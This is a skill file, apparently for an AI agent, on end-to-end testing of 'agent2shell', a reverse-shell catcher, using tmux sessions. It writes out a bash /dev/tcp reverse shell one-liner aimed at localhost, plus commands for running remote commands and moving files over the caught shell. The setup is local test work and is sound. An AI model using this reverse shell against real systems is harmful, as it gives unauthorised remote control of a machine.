---
name: agent2shell-e2e-testing
description: >
  How to set up and run end-to-end tests for agent2shell using tmux sessions
  to simulate a real reverse shell engagement. Use this skill when testing
  agent2shell manually, setting up a tmux-based test environment, verifying
  catch/run/status/list/push/pull commands work end-to-end, or when an AI
  agent needs to automate E2E testing of agent2shell via tmux send-keys.
  Includes critical rules for automated testing to avoid breaking the
  interactive terminal.
---

# E2E Testing with tmux

Manual end-to-end testing of agent2shell using tmux sessions to simulate a real reverse shell engagement.

## Setup

Three tmux sessions:

| Session | Role | What runs |
|---------|------|-----------|
| **Session A** | Operator | `agent2shell catch -p 4444` — catches the reverse shell |
| **Session B** | Victim | `bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'` — sends the reverse shell |
| **Session C** | Agent/Tester | `agent2shell run`, `status`, `list`, `push`, `pull` — programmatic access |

## Steps

1. Start the listener (Session A)
```bash
agent2shell catch -p 4444
```

2. Send reverse shell (Session B)
```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

3. Wait for "[*] Session ready: /tmp/a2s-1.sock" in Session A

4. Test from Session C
```bash
agent2shell run whoami
agent2shell run uname -a
agent2shell status
agent2shell status --json
agent2shell list
agent2shell list --json
```

5. Test file transfer
```bash
echo "test content" > /tmp/test-push.txt
agent2shell push /tmp/test-push.txt /tmp/test-received.txt
agent2shell pull /tmp/test-received.txt /tmp/test-pulled.txt
diff /tmp/test-push.txt /tmp/test-pulled.txt  # should match
```

6. Test interactive mode in Session A
Type commands directly — output appears in the terminal
Ctrl-C sends interrupt to remote shell
Ctrl-C twice within 2 seconds shuts down

7. Clean up
Ctrl-C twice in Session A to shut down
Session B returns to its shell prompt


## Rules for Automated Testing (AI agents using tmux)

1. **NEVER send commands to Session A** via `tmux send-keys` after setup — that's the operator's interactive terminal. The stdin reader goroutine owns it.
2. Only use `tmux send-keys` for Session A and B during **initial setup** (starting catch, sending reverse shell).
3. All testing happens from Session C using `agent2shell run`, `status`, `list`, etc.
4. Use `tmux capture-pane -t <session> -p` to **observe** Session A output — never to interact.
5. Always wrap socket API calls with `timeout 10` to prevent hangs.
6. Clean stale sockets before each test: `rm -f /tmp/a2s-*.sock 2>/dev/null`
7. Kill stuck processes via `ps aux | grep "bash.*tcp\|agent2shell"` then `kill <pid>`.
8. Wait **6-8 seconds** after reverse shell connects for detection probes to finish before testing.
9. After testing, kill catch via `tmux send-keys -t <session> C-c` twice (double-tap Ctrl-C).

## Verifying Interactive Mode

Check Session A's output after running socket API commands:

```bash
tmux capture-pane -t <session-a> -p | tail -20
```

You should see `[a2s]` labels for socket API commands and `[local]` for operator-typed commands:

```
[*] Connection from 127.0.0.1:54321
[*] Session ready: /tmp/a2s-1.sock
[a2s] whoami
tester
[a2s] uname -a
Linux 6.8.0-110-generic ...
```

## EC2 Testing

For testing over a real network with SSH tunnel, see `scripts/ec2-create.sh` and `scripts/ec2-destroy.sh`.
